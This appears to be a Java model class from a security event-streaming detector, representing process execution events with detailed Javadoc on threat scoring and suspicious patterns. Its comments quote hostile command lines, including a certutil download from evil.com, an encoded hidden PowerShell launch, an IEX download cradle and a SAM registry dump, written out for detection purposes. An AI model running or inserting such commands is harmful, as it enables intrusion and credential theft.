package com.streamguard.model;

import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.annotation.JsonTypeName;

/**
 * Represents a process execution event in the security event stream.
 *
 * <p>This event type captures all process-level activities including:
 * <ul>
 *   <li>New process creation (program execution)</li>
 *   <li>Process termination</li>
 *   <li>Command-line arguments and parameters</li>
 *   <li>Parent-child process relationships</li>
 *   <li>Privilege levels and permissions</li>
 *   <li>Code signing and verification</li>
 * </ul>
 *
 * <p>Process events are critical for detecting:
 * <ul>
 *   <li>Malware execution (unsigned binaries, suspicious names)</li>
 *   <li>Living-off-the-land attacks (PowerShell, wmic, reg.exe abuse)</li>
 *   <li>Privilege escalation (standard user launching admin tools)</li>
 *   <li>Reconnaissance (whoami, ipconfig, net user commands)</li>
 *   <li>Persistence mechanisms (scheduled tasks, registry modifications)</li>
 *   <li>Lateral movement (psexec, remote execution tools)</li>
 *   <li>Command and control (encoded PowerShell, suspicious network tools)</li>
 * </ul>
 *
 * <p><b>Threat Score Calculation:</b>
 * Base threat scores are typically:
 * <ul>
 *   <li>Normal business applications (signed, expected): 0.0 - 0.1</li>
 *   <li>System utilities in normal context: 0.1 - 0.3</li>
 *   <li>PowerShell/scripting with normal args: 0.2 - 0.4</li>
 *   <li>Unsigned executables: 0.5 - 0.7</li>
 *   <li>PowerShell with encoded/obfuscated commands: 0.7 - 0.9</li>
 *   <li>Known hacking tools (mimikatz, psexec): 0.9 - 1.0</li>
 *   <li>System processes from wrong location: 0.8 - 1.0</li>
 * </ul>
 *
 * <p><b>High-Risk Process Patterns:</b>
 * <ul>
 *   <li><b>Encoded PowerShell:</b> powershell.exe -EncodedCommand</li>
 *   <li><b>Execution Policy Bypass:</b> powershell.exe -ExecutionPolicy Bypass</li>
 *   <li><b>WMIC abuse:</b> wmic process call create</li>
 *   <li><b>Credential dumping:</b> mimikatz, procdump targeting lsass.exe</li>
 *   <li><b>Remote execution:</b> psexec.exe, winrs.exe</li>
 *   <li><b>Network reconnaissance:</b> nmap, nslookup, ping sweeps</li>
 *   <li><b>LOLBins:</b> certutil downloading files, mshta running scripts</li>
 * </ul>
 *
 * <p><b>Parent-Child Relationships to Monitor:</b>
 * <ul>
 *   <li>Microsoft Word → PowerShell (macro malware)</li>
 *   <li>Excel → cmd.exe (macro malware)</li>
 *   <li>Outlook → unusual executables (phishing attachment)</li>
 *   <li>Browser → PowerShell (drive-by download)</li>
 *   <li>Task Scheduler → suspicious executables (persistence)</li>
 * </ul>
 *
 * <p><b>Example Usage - Suspicious PowerShell:</b>
 * <pre>{@code
 * ProcessEvent event = new ProcessEvent(
 *     "192.168.1.110",        // workstation IP
 *     "192.168.1.110",        // same machine (local process)
 *     "regular_user",         // standard user (not admin)
 *     0.88,                   // high threat score
 *     "powershell.exe",       // process name
 *     "powershell.exe -ExecutionPolicy Bypass -EncodedCommand JABzAD0ATgBlAHcA..."
 * );
 *
 * // Set process details
 * event.getProcessDetails().setProcessId(8745);
 * event.getProcessDetails().setParentProcessId(2134);  // spawned by Word.exe
 * event.getProcessDetails().setUserPrivileges("standard");
 * event.getProcessDetails().setSigned(true);  // PowerShell is signed
 * event.getProcessDetails().setSigner("Microsoft Corporation");
 *
 * // But the command line is suspicious (encoded, bypass policy)
 * }</pre>
 *
 * <p><b>Example Usage - Unsigned Executable:</b>
 * <pre>{@code
 * ProcessEvent event = new ProcessEvent(
 *     "192.168.1.120",
 *     "192.168.1.120",
 *     "compromised_user",
 *     0.95,
 *     "svchost32.exe",  // Typosquatting (real svchost.exe has no "32")
 *     "C:\\Temp\\svchost32.exe"
 * );
 *
 * event.getProcessDetails().setSigned(false);  // Not signed - major red flag
 * event.getProcessDetails().setExecutablePath("C:\\Temp\\svchost32.exe");
 * // Real svchost.exe is in C:\Windows\System32\
 * }</pre>
 *
 * @see Event Base event class for common fields
 * @see ProcessDetails Process execution-specific details
 * @author Jose Ortuno
 * @version 1.0
 */
@JsonTypeName("process_execution")
public class ProcessEvent extends Event {

    @JsonProperty("process_details")
    private ProcessDetails processDetails;

    /**
     * Default constructor for Jackson deserialization.
     * Initializes event_type to "process_execution" and creates empty ProcessDetails.
     */
    public ProcessEvent() {
        super();
        this.setEventType("process_execution");
        this.processDetails = new ProcessDetails();
    }

    /**
     * Creates a process execution event with essential fields.
     *
     * @param sourceIp Source IP address (machine where process executed)
     * @param destinationIp Destination IP (same as source for local execution)
     * @param user Username under which the process is running
     * @param threatScore Calculated threat score (0.0 - 1.0)
     * @param processName Name of the process/executable
     * @param commandLine Full command line with arguments
     */
    public ProcessEvent(String sourceIp, String destinationIp, String user,
                       double threatScore, String processName, String commandLine) {
        super("process_execution", sourceIp, destinationIp, user, threatScore);
        this.processDetails = new ProcessDetails();
        this.processDetails.setProcessName(processName);
        this.processDetails.setCommandLine(commandLine);
    }

    public ProcessDetails getProcessDetails() {
        return processDetails;
    }

    public void setProcessDetails(ProcessDetails processDetails) {
        this.processDetails = processDetails;
    }

    @Override
    public String toString() {
        return "ProcessEvent{" +
                "eventId='" + getEventId() + '\'' +
                ", user='" + getUser() + '\'' +
                ", processName='" + processDetails.getProcessName() + '\'' +
                '}';
    }

    /**
     * Contains process execution-specific details that extend the base event information.
     *
     * <p>This class encapsulates all process-related metadata including:
     * <ul>
     *   <li>Process identification (PID, name)</li>
     *   <li>Parent-child relationships</li>
     *   <li>Command-line arguments (full execution context)</li>
     *   <li>Executable location and integrity (path, hash)</li>
     *   <li>Privilege level and security context</li>
     *   <li>Code signing information</li>
     * </ul>
     *
     * <p><b>Process ID (PID) Usage:</b>
     * <ul>
     *   <li>Unique identifier for the process instance</li>
     *   <li>Used to correlate related events (network, file, registry)</li>
     *   <li>Parent PID shows process lineage (attack chains)</li>
     * </ul>
     *
     * <p><b>Command Line Analysis:</b>
     * The command line is the most critical field for detection:
     * <ul>
     *   <li><b>Obfuscation:</b> Base64 encoding, string concatenation, variable substitution</li>
     *   <li><b>Download cradles:</b> IEX(New-Object Net.WebClient).DownloadString(...)</li>
     *   <li><b>File operations:</b> certutil -decode, bitsadmin /transfer</li>
     *   <li><b>Credential access:</b> reg save HKLM\SAM sam.save</li>
     * </ul>
     *
     * <p><b>Privilege Levels:</b>
     * <ul>
     *   <li><b>system:</b> LocalSystem account (highest privileges, used by services)</li>
     *   <li><b>admin:</b> Administrator or elevated user</li>
     *   <li><b>standard:</b> Regular user account (most common)</li>
     * </ul>
     *
     * <p><b>Code Signing Validation:</b>
     * Digital signatures help validate legitimate software:
     * <ul>
     *   <li>Signed by Microsoft Corporation → Usually legitimate</li>
     *   <li>Signed by known vendor → Probably legitimate</li>
     *   <li>Self-signed or no signature → Requires investigation</li>
     *   <li>Signature mismatch → Potential tampering</li>
     * </ul>
     */
    public static class ProcessDetails {
        @JsonProperty("process_name")
        private String processName;

        @JsonProperty("process_id")
        private int processId;

        @JsonProperty("parent_process_id")
        private int parentProcessId;

        @JsonProperty("command_line")
        private String commandLine;

        @JsonProperty("executable_path")
        private String executablePath;

        @JsonProperty("executable_hash")
        private String executableHash;

        @JsonProperty("user_privileges")
        private String userPrivileges; // admin, standard, system

        @JsonProperty("is_signed")
        private boolean isSigned;

        @JsonProperty("signer")
        private String signer;

        /**
         * Default constructor.
         * Initializes numeric fields to 0 and boolean fields to false.
         */
        public ProcessDetails() {}

        // Getters and Setters

        /**
         * Gets the process name (executable filename).
         *
         * <p>Common examples:
         * <ul>
         *   <li>powershell.exe</li>
         *   <li>cmd.exe</li>
         *   <li>chrome.exe</li>
         *   <li>svchost.exe</li>
         * </ul>
         *
         * <p><b>Watch for typosquatting:</b>
         * <ul>
         *   <li>svch0st.exe (zero instead of 'o')</li>
         *   <li>svchost32.exe (no such variant exists)</li>
         *   <li>csrss.exe vs crss.exe</li>
         * </ul>
         *
         * @return Process name
         */
        public String getProcessName() {
            return processName;
        }

        public void setProcessName(String processName) {
            this.processName = processName;
        }

        /**
         * Gets the process ID (PID).
         *
         * <p>Used to:
         * <ul>
         *   <li>Track process lifetime</li>
         *   <li>Correlate events (this PID's network/file/registry activity)</li>
         *   <li>Build process trees</li>
         * </ul>
         *
         * @return Process ID (positive integer)
         */
        public int getProcessId() {
            return processId;
        }

        public void setProcessId(int processId) {
            this.processId = processId;
        }

        /**
         * Gets the parent process ID (PPID).
         *
         * <p>Parent-child relationships reveal attack chains:
         * <ul>
         *   <li><b>Normal:</b> explorer.exe → chrome.exe (user clicked browser)</li>
         *   <li><b>Suspicious:</b> winword.exe → powershell.exe (macro malware)</li>
         *   <li><b>Suspicious:</b> chrome.exe → cmd.exe (exploit/drive-by)</li>
         *   <li><b>Very suspicious:</b> services.exe → cmd.exe from untrusted path</li>
         * </ul>
         *
         * <p>Orphaned processes (PPID = 0 or non-existent) may indicate:
         * <ul>
         *   <li>Process hollowing (parent terminated after spawn)</li>
         *   <li>Direct kernel-level creation</li>
         * </ul>
         *
         * @return Parent process ID
         */
        public int getParentProcessId() {
            return parentProcessId;
        }

        public void setParentProcessId(int parentProcessId) {
            this.parentProcessId = parentProcessId;
        }

        /**
         * Gets the full command line used to execute the process.
         *
         * <p>This is the MOST IMPORTANT field for detection. Contains:
         * <ul>
         *   <li>Executable path</li>
         *   <li>All arguments and flags</li>
         *   <li>File paths, URLs, encoded payloads</li>
         * </ul>
         *
         * <p><b>Red flags in command lines:</b>
         * <ul>
         *   <li>-EncodedCommand, -enc (PowerShell obfuscation)</li>
         *   <li>-ExecutionPolicy Bypass (disabling security)</li>
         *   <li>IEX, Invoke-Expression (running downloaded code)</li>
         *   <li>DownloadString, DownloadFile (downloading payloads)</li>
         *   <li>Base64 encoded strings (hidden commands)</li>
         *   <li>Unusual file paths (%TEMP%, %APPDATA%\Local\Temp)</li>
         *   <li>IP addresses in arguments (direct C2 communication)</li>
         * </ul>
         *
         * <p><b>Example malicious command lines:</b>
         * <pre>
         * powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...
         * cmd.exe /c certutil -urlcache -split -f http://evil.com/payload.exe %TEMP%\a.exe
         * wmic process call create "powershell.exe -nop -w hidden -c IEX..."
         * </pre>
         *
         * @return Full command line with all arguments
         */
        public String getCommandLine() {
            return commandLine;
        }

        public void setCommandLine(String commandLine) {
            this.commandLine = commandLine;
        }

        /**
         * Gets the full path to the executable file.
         *
         * <p>Legitimate system binaries have expected locations:
         * <ul>
         *   <li>C:\Windows\System32\svchost.exe ✓ Expected</li>
         *   <li>C:\Windows\System32\cmd.exe ✓ Expected</li>
         *   <li>C:\Program Files\... ✓ Expected for applications</li>
         * </ul>
         *
         * <p>Suspicious locations:
         * <ul>
         *   <li>C:\Users\...\AppData\Local\Temp\svchost.exe ✗ Wrong location</li>
         *   <li>C:\ProgramData\...\random.exe ✗ Unusual</li>
         *   <li>C:\Windows\Temp\... ✗ Temporary, likely dropped</li>
         *   <li>User's Desktop or Downloads ✗ Recently downloaded</li>
         * </ul>
         *
         * @return Full path to executable
         */
        public String getExecutablePath() {
            return executablePath;
        }

        public void setExecutablePath(String executablePath) {
            this.executablePath = executablePath;
        }

        /**
         * Gets the cryptographic hash of the executable.
         * Typically SHA-256 format: "sha256:abc123..."
         *
         * <p>Executable hashes are used for:
         * <ul>
         *   <li>Malware identification (compare against threat intelligence)</li>
         *   <li>Known-good whitelisting</li>
         *   <li>Tracking malware variants</li>
         *   <li>Forensic analysis</li>
         * </ul>
         *
         * @return Executable hash, or null if not calculated
         */
        public String getExecutableHash() {
            return executableHash;
        }

        public void setExecutableHash(String executableHash) {
            this.executableHash = executableHash;
        }

        /**
         * Gets the privilege level under which the process is running.
         *
         * <p><b>Privilege escalation detection:</b>
         * If a standard user is running admin-level tools, investigate:
         * <ul>
         *   <li>UAC bypass techniques</li>
         *   <li>Token theft/impersonation</li>
         *   <li>Exploit-based privilege escalation</li>
         * </ul>
         *
         * @return Privilege level (system, admin, standard)
         */
        public String getUserPrivileges() {
            return userPrivileges;
        }

        public void setUserPrivileges(String userPrivileges) {
            this.userPrivileges = userPrivileges;
        }

        /**
         * Indicates whether the executable has a valid digital signature.
         *
         * <p>Code signing provides trust validation:
         * <ul>
         *   <li><b>Signed:</b> Publisher verified, code integrity confirmed</li>
         *   <li><b>Unsigned:</b> Unknown origin, requires investigation</li>
         * </ul>
         *
         * <p><b>Note:</b> Malware can be signed (stolen certificates, legitimate but vulnerable software).
         * However, unsigned executables require much more scrutiny.
         *
         * @return true if executable is digitally signed
         */
        public boolean isSigned() {
            return isSigned;
        }

        public void setSigned(boolean signed) {
            isSigned = signed;
        }

        /**
         * Gets the name of the code signer (certificate owner).
         *
         * <p>Common legitimate signers:
         * <ul>
         *   <li>Microsoft Corporation</li>
         *   <li>Microsoft Windows</li>
         *   <li>Adobe Systems Incorporated</li>
         *   <li>Google LLC</li>
         * </ul>
         *
         * <p>Unknown or suspicious signers should be investigated.
         * Some malware uses stolen or fraudulent certificates.
         *
         * @return Signer name, or null if unsigned or not available
         */
        public String getSigner() {
            return signer;
        }

        public void setSigner(String signer) {
            this.signer = signer;
        }
    }
}